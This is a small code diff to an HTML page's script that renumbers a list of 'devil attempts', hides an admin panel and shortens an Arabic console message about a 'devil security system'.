       devilAttempts.reverse();
-      devilAttempts.forEach((item, idx) => {
-        item.id = idx + 1;
-      });
+      devilAttempts.forEach(function(item, idx) { item.id = idx + 1; });
       renderDevilList();
     }
     initDemo();
 
-    // التأكد من أن لوحة المسؤول مخفية
     adminPanel.style.display = 'none';
     adminPanel.classList.remove('active');
     errorMsg.classList.remove('show');
 
-    console.log('🔥 نظام الشيطان الأمني جاهز مع تحديثات جديدة');
+    console.log('🔥 نظام الشيطان الأمني جاهز');
   })();
 </script>
 </body>
 </html>
-```
